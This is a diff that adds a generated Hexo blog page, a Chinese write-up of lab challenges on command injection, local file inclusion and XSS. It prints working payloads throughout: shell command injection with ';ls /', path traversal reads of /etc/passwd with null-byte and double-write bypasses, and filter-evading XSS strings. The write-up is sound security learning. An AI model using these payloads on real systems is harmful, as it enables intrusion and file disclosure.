@@ -1,37 +1,262 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    xss&amp;命令注入&amp;lfi |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+  
+<link rel="stylesheet" href="/css/technology.css">
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+  
+  
+<script src="/js/pace.min.js"></script>
 
+<meta name="generator" content="Hexo 5.1.1"></head>
 
-{% block content %}
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-xss-命令注入-lfi" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      xss&amp;命令注入&amp;lfi
+    </h1>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
-    </div>
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/28/xss-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-lfi/" class="article-date">
+  <time datetime="2020-08-28T02:46:58.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
   </div>
 
-{% endblock %}
+      </div>
+    
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <div class="article-entry" itemprop="articleBody">
+      
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+      
+
+      
+        <p>去爬山了…昨天的内容没搞，今天补上emm</p>
+<h3 id="0x01-命令注入"><a href="#0x01-命令注入" class="headerlink" title="0x01 命令注入"></a>0x01 命令注入</h3><p>命令注入这六个题相对来说挺简单的，一个一个来看</p>
+<h5 id="CMD-1"><a href="#CMD-1" class="headerlink" title="CMD-1"></a>CMD-1</h5><p>没有任何过滤，直接<code>?cmd=ls</code>即可。</p>
+<h5 id="CMD-2"><a href="#CMD-2" class="headerlink" title="CMD-2"></a>CMD-2</h5><p>跟CMD-1一样，只不过变成了post，同理POST: cmd=ls。</p>
+<h5 id="CMD-3"><a href="#CMD-3" class="headerlink" title="CMD-3"></a>CMD-3</h5><p>GET型，直接<code>;ls /</code>即可(linux命令以分号结束)。</p>
+<h5 id="CMD-4"><a href="#CMD-4" class="headerlink" title="CMD-4"></a>CMD-4</h5><p>同CMD-3，只不过换成了POST型。</p>
+<h5 id="CMD-5"><a href="#CMD-5" class="headerlink" title="CMD-5"></a>CMD-5</h5><p>随意输入baidu.com提交后，发现url处变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?domain&#x3D;baidu.com&amp;server&#x3D;whois.publicinterestregistry.net</span><br></pre></td></tr></table></figure>
+
+<p>查看源码发现domain小写化后进行正则过滤，好像是要符合域名规范，不过好像<code>;ls /</code>直接就绕过了..不需要在server处注入。</p>
+<h5 id="CMD-6"><a href="#CMD-6" class="headerlink" title="CMD-6"></a>CMD-6</h5><p>同CMD-5，只不过变成了POST。</p>
+<h3 id="0x02-LFI-本地文件读取"><a href="#0x02-LFI-本地文件读取" class="headerlink" title="0x02 LFI(本地文件读取)"></a>0x02 LFI(本地文件读取)</h3><h5 id="LFI-1"><a href="#LFI-1" class="headerlink" title="LFI-1"></a>LFI-1</h5><p>直接任意文件读取,payload:<code>/etc/passwd</code></p>
+<h5 id="LFI-2"><a href="#LFI-2" class="headerlink" title="LFI-2"></a>LFI-2</h5><p>%00截断，payload:<code>?library=../../../flag%00</code></p>
+<h5 id="LFI-3"><a href="#LFI-3" class="headerlink" title="LFI-3"></a>LFI-3</h5><p>查看源码发现代码会检查最后四位是否是’.php’，这里绕过方法有很多：</p>
+<p>1.加点<code>.</code>（win）</p>
+<p>2.追加<code>/.</code>（win）</p>
+<p>3.追加不可见字符，例如%00</p>
+<p>4.大小写绕过（win）</p>
+<p>5.<code>::$DATA</code>（win）</p>
+<p>6.其他可解析后缀，例如php3,php4,php5,phtml等</p>
+<h5 id="LFI-4"><a href="#LFI-4" class="headerlink" title="LFI-4"></a>LFI-4</h5><p>查看源码发现重要的一行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;includes/class_&#x27;</span>.addslashes($_GET[<span class="string">&#x27;class&#x27;</span>]).<span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这里可以跟LFI-2思路一样，不过不能使用%00截断，因为addslashes函数会对单引号，双引号，反斜杠，0x00进行转义，造成%00截断失效。</p>
+<p>这里吧<code>class_</code>当成一个目录即可，用<code>../</code>跳出去。payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?class&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<h5 id="LFI-5"><a href="#LFI-5" class="headerlink" title="LFI-5"></a>LFI-5</h5><p>查看源码发现过滤了<code>../</code>，但是只是替换成空字符，且只替换一次，故通过双写<code>../</code>即可绕过。payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<h5 id="LFI-6-7-8-9-10"><a href="#LFI-6-7-8-9-10" class="headerlink" title="LFI-6/7/8/9/10"></a>LFI-6/7/8/9/10</h5><p>只是换成了post型，跟LFI-1/2/3/4/5相同。</p>
+<h5 id="LFI-11"><a href="#LFI-11" class="headerlink" title="LFI-11"></a>LFI-11</h5><p>查看源码发现需要post提交一个stylepath参数，但是文本框提交的不是，所以需要自己来，故通过firefox的hackbar插件完成post提交，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stylepath&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<h5 id="LFI-12"><a href="#LFI-12" class="headerlink" title="LFI-12"></a>LFI-12</h5><p>跟上一题一样，只不过换成了get方式</p>
+<h5 id="LFI-13"><a href="#LFI-13" class="headerlink" title="LFI-13"></a>LFI-13</h5><p>和LFI-5一样(懵，为什么一样)</p>
+<h5 id="LFI-14"><a href="#LFI-14" class="headerlink" title="LFI-14"></a>LFI-14</h5><p>和LFI-5一样，换成POST请求</p>
+<h5 id="LFI-15"><a href="#LFI-15" class="headerlink" title="LFI-15"></a>LFI-15</h5><p>查看源码发现需要传入cookie，最终include的是cookie中TEMPLATE的值，故传入即可。payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-XSS"><a href="#0x03-XSS" class="headerlink" title="0x03 XSS"></a>0x03 XSS</h3><blockquote>
+<p>xss(跨站脚本攻击)是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</p>
+<p>xss攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。                                                                   –来自维基百科</p>
+</blockquote>
+<p>一般会遇到的过滤函数：</p>
+<ol>
+<li><code>htmlspecialchars()</code>: 函数把预定义的字符转换为 HTML 实体<ul>
+<li>范围: <code>&lt;&gt; &amp; &quot;</code>.</li>
+<li><code>&#39;</code> 默认配置不被过滤.</li>
+</ul>
+</li>
+<li><code>str_replace()</code>: 替换函数，注意它只替换<strong>一轮</strong>，并且<strong>区分大小写</strong>. 当被替换的目标串为空，可以考虑<strong>双写</strong>饶过.</li>
+<li><code>strtolower()</code> 函数将字符串转化为小写，防止大小写绕过.</li>
+<li><code>strpos()</code> 函数查找字符串在另一字符串中第一次出现的位置，并且<strong>对大小写敏感</strong>.</li>
+<li><code>angularjs</code> 中的 <code>ng-include</code>, 相当于 PHP 中 <code>include</code> 函数，能够包含其他文件.</li>
+</ol>
+<p>积累一些基本的xss的payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;scRIpT&gt;<span class="keyword">new</span> <span class="class"><span class="keyword">class</span> <span class="keyword">extends</span> <span class="title">confirm</span>`4`</span>&#123;&#125;&lt;<span class="regexp">/SCripT&gt; /</span><span class="regexp">/绕过script大小写，括号，alert等函数</span></span><br><span class="line"><span class="regexp">&lt;script&gt;(((confirm)))`666`&lt;/</span>script&gt; <span class="comment">// 绕过括号，alert等函数限制</span></span><br><span class="line">&lt;script&gt;co\u006efirm(<span class="number">666</span>)&lt;/script&gt;</span><br><span class="line">&lt;svg/onload=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;script&gt;&#123;confirm<span class="string">`NB`</span>&#125;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert<span class="string">`111`</span>&lt;/script&gt;</span><br><span class="line">%<span class="number">3</span>c/title%<span class="number">3</span>e%<span class="number">3</span>cscript%<span class="number">3</span>ealert<span class="string">`%22xss%22`</span>%<span class="number">3</span>c/script%<span class="number">3</span>e</span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-1"><a href="#Level-1" class="headerlink" title="Level-1"></a>Level-1</h5><p>使用最基本的payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="regexp">/xss/</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-2"><a href="#Level-2" class="headerlink" title="Level-2"></a>Level-2</h5><p>查看源码发现htmlspecialchars过滤了，不过这里可以通过<code>&lt;input&gt;</code>标签处的闭合来进行代码注入，payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=aaa<span class="string">&quot;&gt; &lt;script&gt;alert(/xss/);&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然多了个<code>&quot;&gt;</code>，但也还是能执行。</p>
+<h5 id="Level-3"><a href="#Level-3" class="headerlink" title="Level-3"></a>Level-3</h5><p>跟上一题相比，value里面的str也被过滤了，标签无法使用，但是可以加监听事件来实现代码执行，payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; onclick=alert(/xss/) //</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-4"><a href="#Level-4" class="headerlink" title="Level-4"></a>Level-4</h5><p>和上一题一样可以通过事件触发，payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; onclick=alert(/xss/) &quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>(也可以大小写绕过)</p>
+<h5 id="Level-5"><a href="#Level-5" class="headerlink" title="Level-5"></a>Level-5</h5><p>查看源码发现<code>&lt;script&gt;</code>会被替换成<code>&lt;scr_ipt&gt;</code>,<code>on</code>会被替换成<code>o_n</code>，且无法绕过，不过发现a标签未被过滤，故通过a标签执行js代码。payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;a href=&quot;</span> javascript:alert(<span class="regexp">/xss/</span>)<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>(本题也可以大小写绕过)</p>
+<h5 id="Level-6"><a href="#Level-6" class="headerlink" title="Level-6"></a>Level-6</h5><p>本题大小写绕过即可。payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;sCript&gt;alert(/xss/);&lt;/Script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-7"><a href="#Level-7" class="headerlink" title="Level-7"></a>Level-7</h5><p>这次全部替换为小写，但是却是将敏感的keyword替换成空字符，故可通过双写绕过，payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt; &lt;scscriptript&gt;alert(/xss/);&lt;/scrscriptipt&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-8"><a href="#Level-8" class="headerlink" title="Level-8"></a>Level-8</h5><p>这次转化为小写后替换成无法执行的内容，且过滤了双引号。可以通过html实体编码绕过，payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br><span class="line"><span class="comment">//翻译过来就是：javascript:alert(1)</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-9"><a href="#Level-9" class="headerlink" title="Level-9"></a>Level-9</h5><p>查看源码发现可以从友情链接处入手(未被过滤)。但是要求带<code>http://</code>协议头(位置无限制)。payload：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)// http://</span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-10"><a href="#Level-10" class="headerlink" title="Level-10"></a>Level-10</h5><p>查看源码发现三个隐藏起来的input。发现t_sort可以利用，但是需要先将他调整为可见，才可以植入事件触发xss，payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa<span class="string">&quot; type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-11"><a href="#Level-11" class="headerlink" title="Level-11"></a>Level-11</h5><p>查看源码发现隐藏的四个input框有一个t_ref比较特殊，似乎value的内容刚好就是上一个页面的内容，尝试构造一个Referer试试：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: &quot;type=&quot;text&quot; onclick=&quot;alert(/xss/)</span><br></pre></td></tr></table></figure>
+
+<p>果然生效了。</p>
+<h5 id="Level-12"><a href="#Level-12" class="headerlink" title="Level-12"></a>Level-12</h5><p>跟11题一样，不过变成了User-Agent。</p>
+<h5 id="Level-13"><a href="#Level-13" class="headerlink" title="Level-13"></a>Level-13</h5><p>跟11题一样，不管换成了Cookie。</p>
+<h5 id="Level-14"><a href="#Level-14" class="headerlink" title="Level-14"></a>Level-14</h5><p>这个题是要借助上传图片xss来完成。访问<code>http://www.exifviewer.org</code>，然后长传一个带有xss代码的图片触发xss。将图片的标题主题标记备注作者版权等信息全部修改为如下payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’ “&gt;&lt;img src&#x3D;xxx onerror&#x3D;alert(&#x2F;xss&#x2F;)’ 1.jpeg</span><br></pre></td></tr></table></figure>
+
+<p>上传后，则可触发xss。</p>
+<h5 id="Level-15"><a href="#Level-15" class="headerlink" title="Level-15"></a>Level-15</h5><p>这里用了 <code>angularjs</code> 的 <code>ng-include</code>, <code>ng-include</code> 指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。<code>ng-include</code> 属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下，相当于 PHP 的 <code>include</code> 函数。</p>
+<p>本题payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;level15.php?src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>(具体原理还没理解透彻，angularjs还没学过…)</p>
+<h5 id="Level-16"><a href="#Level-16" class="headerlink" title="Level-16"></a>Level-16</h5><p>查看源码发现特殊符号和空格会被转义，<code>script</code> 会被替换成 <code> </code>，并且转换为小写。</p>
+<p>这里通过%0d %0a等分隔符绕过空格的过滤，同时使用img标签(不需要</img>)，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword&#x3D;&lt;img%0Dsrc&#x3D;1%0Donerror&#x3D;alert(&#x2F;xss&#x2F;)&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-17"><a href="#Level-17" class="headerlink" title="Level-17"></a>Level-17</h5><p>查看源码发现这一行：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">xsf01.swf?xxxxxxxxx</span>=<span class="string">sssss</span> <span class="attr">width</span>=<span class="string">100%</span> <span class="attr">heigth</span>=<span class="string">100%</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span> <span class="attr">align</span>=<span class="string">center</span>&gt;</span>成功后，<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">level18.php?arg01</span>=<span class="string">a&amp;arg02</span>=<span class="string">b</span>&gt;</span>点我进入下一关<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>相关php代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.htmlspecialchars($_GET[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>使用onmouseover触发事件，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01&#x3D;aaa&amp;arg02&#x3D; onmouseover&#x3D;alert(&#x2F;xss&#x2F;)</span><br></pre></td></tr></table></figure>
+
+<h5 id="Level-18-19-20"><a href="#Level-18-19-20" class="headerlink" title="Level-18/19/20"></a>Level-18/19/20</h5><p>Flash xss内容，暂时不考虑。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://su29029.github.io/2020/08/28/xss-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5-lfi/" data-id="ckedortm5001axity5no9eui2"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/28/xxe%E9%97%AE%E9%A2%98/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            xxe问题
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">sql注入过滤问题</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
